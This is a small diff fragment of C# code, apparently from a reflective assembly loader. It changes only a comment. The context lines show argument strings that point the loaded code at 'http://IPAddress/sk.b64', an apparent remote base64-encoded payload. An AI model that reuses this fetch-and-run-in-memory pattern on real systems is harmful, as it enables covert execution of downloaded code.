@@ -34,7 +34,7 @@ Change Execution to:
 			 //object o = a.CreateInstance(method.Name);
             		 //method.Invoke(o, null);
 			 
-			 //If Args are required uncomment below two lines and comment above line
+			 //If multiple Args are required uncomment below two lines and comment above lines
 			 string args1 = "-net";
 			 string args2 = "http://IPAddress/sk.b64";
 			 string args3 = "\"test\"";
